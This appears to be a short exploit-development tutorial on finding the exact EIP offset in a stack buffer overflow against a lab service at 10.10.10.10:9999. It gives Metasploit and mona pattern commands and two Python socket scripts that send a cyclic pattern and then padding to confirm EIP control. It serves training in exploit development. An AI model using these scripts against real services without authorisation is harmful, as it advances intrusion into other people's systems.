# Buffer Overflow: Finding the Offset (EIP)

Once you know the approximate crash point, find the exact offset to control EIP.

## Step 1: Generate Cyclic Pattern
```bash
# Generate pattern of length = crash length + 400 (for safety)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
# Or use mona directly in Immunity
!mona pattern_create 3000
```

## Step 2: Send Pattern to Target
```python
#!/usr/bin/python3
import socket

ip = "10.10.10.10"
port = 9999

# Replace with your generated pattern
buffer = "Aa0Aa1Aa2Aa3Aa4...<FULL_PATTERN>"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(("COMMAND " + buffer + "\r\n").encode())
s.close()
```

## Step 3: Find the Offset
```bash
# In Immunity Debugger, note the EIP value (e.g., 6F43376E)

# From command line:
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 6F43376E
# Output: Exact match at offset 2003

# Or in Immunity:
!mona findmsp
```

## Step 4: Verify EIP Control
```python
#!/usr/bin/python3
import socket

ip = "10.10.10.10"
port = 9999
offset = 2003  # Your exact offset

buffer = b"A" * offset + b"B" * 4 + b"C" * (3000 - offset - 4)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(b"COMMAND " + buffer + b"\r\n")
s.close()
# EIP should now be 42424242 (BBBB)
```
